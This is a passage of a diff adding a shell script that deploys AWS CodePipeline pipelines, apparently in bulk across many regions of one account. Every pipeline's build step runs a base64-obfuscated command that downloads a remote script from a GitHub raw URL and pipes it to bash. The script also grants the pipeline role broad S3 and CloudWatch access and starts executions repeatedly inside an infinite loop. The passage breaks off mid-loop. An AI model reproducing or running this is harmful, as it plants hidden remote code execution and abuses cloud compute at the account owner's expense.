+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > euwest31.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "euwest3-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > euwest32.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "euwest3-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > euwest33.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "euwest3-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > eunorth11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "eunorth1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > eunorth12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "eunorth1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > eunorth13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "eunorth1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > saeast11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "saeast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > saeast12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "saeast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > saeast13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "saeast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+aws iam attach-role-policy --role-name AWSCodePipelineServiceRole-us-east-1-aaaa1 --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --output text
+aws iam attach-role-policy --role-name AWSCodePipelineServiceRole-us-east-1-aaaa1 --policy-arn arn:aws:iam::aws:policy/CloudWatchFullAccess --output text
+aws iam attach-role-policy --role-name AWSCodePipelineServiceRole-us-east-1-aaaa1 --policy-arn arn:aws:iam::aws:policy/CloudWatchFullAccessV2 --output text
+
+aws s3 mb s3://useast1-687185077845 --region us-east-1 --output text
+aws s3 mb s3://useast2-687185077845 --region us-east-2 --output text
+aws s3 mb s3://uswest1-687185077845 --region us-west-1 --output text
+aws s3 mb s3://uswest2-687185077845 --region us-west-2 --output text
+aws s3 mb s3://apsouth1-687185077845 --region ap-south-1 --output text
+aws s3 mb s3://apnortheast3-687185077845 --region ap-northeast-3 --output text
+aws s3 mb s3://apnortheast2-687185077845 --region ap-northeast-2 --output text
+aws s3 mb s3://apsoutheast1-687185077845 --region ap-southeast-1 --output text
+aws s3 mb s3://apsoutheast2-687185077845 --region ap-southeast-2 --output text
+aws s3 mb s3://apnortheast1-687185077845 --region ap-northeast-1 --output text
+aws s3 mb s3://cacentral1-687185077845 --region ca-central-1 --output text
+aws s3 mb s3://eucentral1-687185077845 --region eu-central-1 --output text
+aws s3 mb s3://euwest1-687185077845 --region eu-west-1 --output text
+aws s3 mb s3://euwest2-687185077845 --region eu-west-2 --output text
+aws s3 mb s3://euwest3-687185077845 --region eu-west-3 --output text
+aws s3 mb s3://eunorth1-687185077845 --region eu-north-1 --output text
+aws s3 mb s3://saeast1-687185077845 --region sa-east-1 --output text
+
+aws codepipeline create-pipeline --cli-input-json file://useast11.json --region us-east-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://useast12.json --region us-east-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://useast13.json --region us-east-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://useast21.json --region us-east-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://useast22.json --region us-east-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://useast23.json --region us-east-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://uswest11.json --region us-west-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://uswest12.json --region us-west-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://uswest13.json --region us-west-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://uswest21.json --region us-west-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://uswest22.json --region us-west-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://uswest23.json --region us-west-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://apsouth11.json --region ap-south-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://apsouth12.json --region ap-south-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://apsouth13.json --region ap-south-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://apnortheast31.json --region ap-northeast-3 --output text
+aws codepipeline create-pipeline --cli-input-json file://apnortheast32.json --region ap-northeast-3 --output text
+aws codepipeline create-pipeline --cli-input-json file://apnortheast33.json --region ap-northeast-3 --output text
+aws codepipeline create-pipeline --cli-input-json file://apnortheast21.json --region ap-northeast-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://apnortheast22.json --region ap-northeast-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://apnortheast23.json --region ap-northeast-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://apsoutheast11.json --region ap-southeast-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://apsoutheast12.json --region ap-southeast-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://apsoutheast13.json --region ap-southeast-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://apsoutheast21.json --region ap-southeast-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://apsoutheast22.json --region ap-southeast-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://apsoutheast23.json --region ap-southeast-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://apnortheast11.json --region ap-northeast-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://apnortheast12.json --region ap-northeast-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://apnortheast13.json --region ap-northeast-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://cacentral11.json --region ca-central-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://cacentral12.json --region ca-central-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://cacentral13.json --region ca-central-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://eucentral11.json --region eu-central-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://eucentral12.json --region eu-central-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://eucentral13.json --region eu-central-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://euwest11.json --region eu-west-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://euwest12.json --region eu-west-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://euwest13.json --region eu-west-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://euwest21.json --region eu-west-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://euwest22.json --region eu-west-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://euwest23.json --region eu-west-2 --output text
+aws codepipeline create-pipeline --cli-input-json file://euwest31.json --region eu-west-3 --output text
+aws codepipeline create-pipeline --cli-input-json file://euwest32.json --region eu-west-3 --output text
+aws codepipeline create-pipeline --cli-input-json file://euwest33.json --region eu-west-3 --output text
+aws codepipeline create-pipeline --cli-input-json file://eunorth11.json --region eu-north-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://eunorth12.json --region eu-north-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://eunorth13.json --region eu-north-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://saeast11.json --region sa-east-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://saeast12.json --region sa-east-1 --output text
+aws codepipeline create-pipeline --cli-input-json file://saeast13.json --region sa-east-1 --output text
+
+cat > b <<EOF
+while true; do
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-1
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-east-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-east-2
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
